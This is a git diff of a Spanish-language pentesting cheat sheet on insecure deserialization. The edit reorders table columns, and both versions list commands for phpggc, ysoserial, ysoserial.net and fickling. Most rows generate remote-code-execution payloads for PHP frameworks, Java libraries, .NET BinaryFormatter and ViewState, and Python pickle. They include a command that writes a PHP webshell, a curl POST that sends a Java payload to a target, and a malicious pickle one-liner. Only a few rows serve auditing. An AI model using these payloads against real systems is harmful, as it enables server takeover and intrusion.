@@ -24,19 +24,19 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Instalación | `git clone https://github.com/ambionics/phpggc && cd phpggc` | PHP CLI. |
-| Listar gadgets | `./phpggc -l` | Muestra todos los chains disponibles por framework. |
-| Filtrar por framework | `./phpggc -l Monolog` | Solo Monolog (logger). |
-| Generar RCE Monolog | `./phpggc Monolog/RCE1 system "id"` | Output: serializado PHP. |
-| Generar para Laravel | `./phpggc Laravel/RCE9 system "id"` | Frameworks comunes. |
-| Generar para WordPress | `./phpggc WordPress/RCE1 system "id"` | WP gadget chain. |
-| Generar para Symfony | `./phpggc Symfony/RCE1 system "id"` | Symfony chains. |
-| Output base64 | `./phpggc -b Monolog/RCE1 system "id"` | Ya base64 encoded. |
-| Output url-encoded | `./phpggc -u Monolog/RCE1 system "id"` | Para inyectar en GET. |
-| Output JSON-safe | `./phpggc -ud Monolog/RCE1 system "id"` | Doble encoding url. |
-| Wrap en Phar | `./phpggc -p phar -pj polyglot.jpg Monolog/RCE1 system "id" -o evil.phar` | Phar polyglot — para LFI + Phar. |
-| File write | `./phpggc Guzzle/FW1 /var/www/html/sh.php '<?=\`$_GET[c]\`?>'` | Escribir webshell. |
-| Test gadget | `./phpggc -t -p phar Monolog/RCE1 system "id"` | Verifica que funciona en stack PHP local. |
+| `git clone https://github.com/ambionics/phpggc && cd phpggc` | Instalación | PHP CLI. |
+| `./phpggc -l` | Listar gadgets | Muestra todos los chains disponibles por framework. |
+| `./phpggc -l Monolog` | Filtrar por framework | Solo Monolog (logger). |
+| `./phpggc Monolog/RCE1 system "id"` | Generar RCE Monolog | Output: serializado PHP. |
+| `./phpggc Laravel/RCE9 system "id"` | Generar para Laravel | Frameworks comunes. |
+| `./phpggc WordPress/RCE1 system "id"` | Generar para WordPress | WP gadget chain. |
+| `./phpggc Symfony/RCE1 system "id"` | Generar para Symfony | Symfony chains. |
+| `./phpggc -b Monolog/RCE1 system "id"` | Output base64 | Ya base64 encoded. |
+| `./phpggc -u Monolog/RCE1 system "id"` | Output url-encoded | Para inyectar en GET. |
+| `./phpggc -ud Monolog/RCE1 system "id"` | Output JSON-safe | Doble encoding url. |
+| `./phpggc -p phar -pj polyglot.jpg Monolog/RCE1 system "id" -o evil.phar` | Wrap en Phar | Phar polyglot — para LFI + Phar. |
+| `./phpggc Guzzle/FW1 /var/www/html/sh.php '<?=\`$_GET[c]\`?>'` | File write | Escribir webshell. |
+| `./phpggc -t -p phar Monolog/RCE1 system "id"` | Test gadget | Verifica que funciona en stack PHP local. |
 ^deser-tool-phpggc
 
 ---
@@ -45,20 +45,20 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Descargar JAR | `wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar` | Releases oficiales. |
-| Listar gadgets | `java -jar ysoserial-all.jar` | Lista todos los chains. |
-| Generar URLDNS (probe) | `java -jar ysoserial-all.jar URLDNS "http://canary.oast.fun/" \| base64 -w0` | Canary sin RCE. |
-| CommonsCollections1-7 | `java -jar ysoserial-all.jar CommonsCollections5 "id"` | Apache Commons Collections. |
-| CommonsBeanutils | `java -jar ysoserial-all.jar CommonsBeanutils1 "id"` | Spring + Beanutils. |
-| Spring1/Spring2 | `java -jar ysoserial-all.jar Spring1 "id"` | Spring framework. |
-| Hibernate1 | `java -jar ysoserial-all.jar Hibernate1 "id"` | Hibernate ORM. |
-| JBossInterceptors1 | `java -jar ysoserial-all.jar JBossInterceptors1 "id"` | JBoss EAP. |
-| Groovy1 | `java -jar ysoserial-all.jar Groovy1 "id"` | Groovy en classpath. |
-| MozillaRhino1 | `java -jar ysoserial-all.jar MozillaRhino1 "id"` | Rhino JS engine. |
-| ROME (Apache) | `java -jar ysoserial-all.jar ROME "id"` | RSS feed lib. |
-| Output binary directo | `java -jar ysoserial-all.jar CommonsCollections5 "id" > rce.bin` | Sin base64. |
-| Combinar con curl | `curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @rce.bin https://target/` | Direct POST. |
-| Modified ysoserial (con más gadgets) | `https://github.com/wh1t3p1g/ysoserial` (fork)  | Más chains modernos. |
+| `wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar` | Descargar JAR | Releases oficiales. |
+| `java -jar ysoserial-all.jar` | Listar gadgets | Lista todos los chains. |
+| `java -jar ysoserial-all.jar URLDNS "http://canary.oast.fun/" \| base64 -w0` | Generar URLDNS (probe) | Canary sin RCE. |
+| `java -jar ysoserial-all.jar CommonsCollections5 "id"` | CommonsCollections1-7 | Apache Commons Collections. |
+| `java -jar ysoserial-all.jar CommonsBeanutils1 "id"` | CommonsBeanutils | Spring + Beanutils. |
+| `java -jar ysoserial-all.jar Spring1 "id"` | Spring1/Spring2 | Spring framework. |
+| `java -jar ysoserial-all.jar Hibernate1 "id"` | Hibernate1 | Hibernate ORM. |
+| `java -jar ysoserial-all.jar JBossInterceptors1 "id"` | JBossInterceptors1 | JBoss EAP. |
+| `java -jar ysoserial-all.jar Groovy1 "id"` | Groovy1 | Groovy en classpath. |
+| `java -jar ysoserial-all.jar MozillaRhino1 "id"` | MozillaRhino1 | Rhino JS engine. |
+| `java -jar ysoserial-all.jar ROME "id"` | ROME (Apache) | RSS feed lib. |
+| `java -jar ysoserial-all.jar CommonsCollections5 "id" > rce.bin` | Output binary directo | Sin base64. |
+| `curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @rce.bin https://target/` | Combinar con curl | Direct POST. |
+| `https://github.com/wh1t3p1g/ysoserial` (fork) | Modified ysoserial (con más gadgets) | Más chains modernos. |
 ^deser-tool-ysoserial
 
 ---
@@ -67,19 +67,19 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Descargar | `https://github.com/pwntester/ysoserial.net/releases` | Windows binary. |
-| Listar gadgets | `ysoserial.net.exe --list` | Gadgets + formatters. |
-| Listar formatters | `ysoserial.net.exe --formatter-list` | Formats: BinaryFormatter, LosFormatter, etc. |
-| TextFormattingRunProperties | `ysoserial.net.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc"` | Default reliable. |
-| TypeConfuseDelegate | `ysoserial.net.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"` | Bypass de filtros. |
-| ObjectDataProvider | `ysoserial.net.exe -g ObjectDataProvider -f Json.Net -c "calc"` | Para JSON.NET. |
-| WindowsClaimsIdentity | `ysoserial.net.exe -g WindowsClaimsIdentity -f BinaryFormatter -c "calc"` | .NET Framework 4.7+. |
-| ViewState exploit (no MAC) | `ysoserial.net.exe -p ViewState -g TextFormattingRunProperties -c "calc" --path="/test.aspx" --apppath="/"` | Sin validation key. |
-| ViewState con validation key | `--validationkey=<hex> --validationalg=SHA1 --decryptionkey=<hex> --decryptionalg=AES` | Con keys del web.config. |
-| Output base64 | `--output=base64` | Default. |
-| Output raw | `--output=raw > payload.bin` | Sin encoding. |
-| Output URL-encoded | `--output=urlencoded` | Para POST forms. |
-| TestPlugin | `--test --plugin=...` | Verifica que funciona local. |
+| `https://github.com/pwntester/ysoserial.net/releases` | Descargar | Windows binary. |
+| `ysoserial.net.exe --list` | Listar gadgets | Gadgets + formatters. |
+| `ysoserial.net.exe --formatter-list` | Listar formatters | Formats: BinaryFormatter, LosFormatter, etc. |
+| `ysoserial.net.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc"` | TextFormattingRunProperties | Default reliable. |
+| `ysoserial.net.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"` | TypeConfuseDelegate | Bypass de filtros. |
+| `ysoserial.net.exe -g ObjectDataProvider -f Json.Net -c "calc"` | ObjectDataProvider | Para JSON.NET. |
+| `ysoserial.net.exe -g WindowsClaimsIdentity -f BinaryFormatter -c "calc"` | WindowsClaimsIdentity | .NET Framework 4.7+. |
+| `ysoserial.net.exe -p ViewState -g TextFormattingRunProperties -c "calc" --path="/test.aspx" --apppath="/"` | ViewState exploit (no MAC) | Sin validation key. |
+| `--validationkey=<hex> --validationalg=SHA1 --decryptionkey=<hex> --decryptionalg=AES` | ViewState con validation key | Con keys del web.config. |
+| `--output=base64` | Output base64 | Default. |
+| `--output=raw > payload.bin` | Output raw | Sin encoding. |
+| `--output=urlencoded` | Output URL-encoded | Para POST forms. |
+| `--test --plugin=...` | TestPlugin | Verifica que funciona local. |
 ^deser-tool-ysoserialnet
 
 ---
@@ -88,16 +88,16 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Instalación | `pip install fickling` | Análisis + exploit pickle. |
-| Análisis estático | `fickling --check evil.pkl` | Detecta opcodes peligrosos sin ejecutar. |
-| Decompile | `fickling --decompile evil.pkl` | Reconstruye Python equivalente. |
-| Trace ejecución | `fickling --trace evil.pkl` | Simula sin ejecutar opcodes peligrosos. |
-| Inyectar en pickle existente | `fickling --inject 'os.system("id")' benign.pkl > evil.pkl` | Injection en archivo legítimo. |
-| Crear pickle malicioso | `fickling --create 'os.system("id")' evil.pkl` | Desde cero. |
-| Output base64 | `fickling --create 'os.system("id")' - \| base64 -w0` | Stdout + b64. |
-| Hook unsafe sinks | `fickling install --hook-strict` | Globally hookea pickle.loads para safety. |
-| Force-decompile model ML | `fickling --decompile model.joblib` | Auditar models pickle. |
-| Manual con pickle | `python3 -c "import pickle, os; class E: ___ def __reduce__(self): return (os.system, ('id',)); print(pickle.dumps(E()))"` | Sin tool externa. |
+| `pip install fickling` | Instalación | Análisis + exploit pickle. |
+| `fickling --check evil.pkl` | Análisis estático | Detecta opcodes peligrosos sin ejecutar. |
+| `fickling --decompile evil.pkl` | Decompile | Reconstruye Python equivalente. |
+| `fickling --trace evil.pkl` | Trace ejecución | Simula sin ejecutar opcodes peligrosos. |
+| `fickling --inject 'os.system("id")' benign.pkl > evil.pkl` | Inyectar en pickle existente | Injection en archivo legítimo. |
+| `fickling --create 'os.system("id")' evil.pkl` | Crear pickle malicioso | Desde cero. |
+| `fickling --create 'os.system("id")' - \| base64 -w0` | Output base64 | Stdout + b64. |
+| `fickling install --hook-strict` | Hook unsafe sinks | Globally hookea pickle.loads para safety. |
+| `fickling --decompile model.joblib` | Force-decompile model ML | Auditar models pickle. |
+| `python3 -c "import pickle, os; class E: ___ def __reduce__(self): return (os.system, ('id',)); print(pickle.dumps(E()))"` | Manual con pickle | Sin tool externa. |
 ^deser-tool-fickling
 
 ---
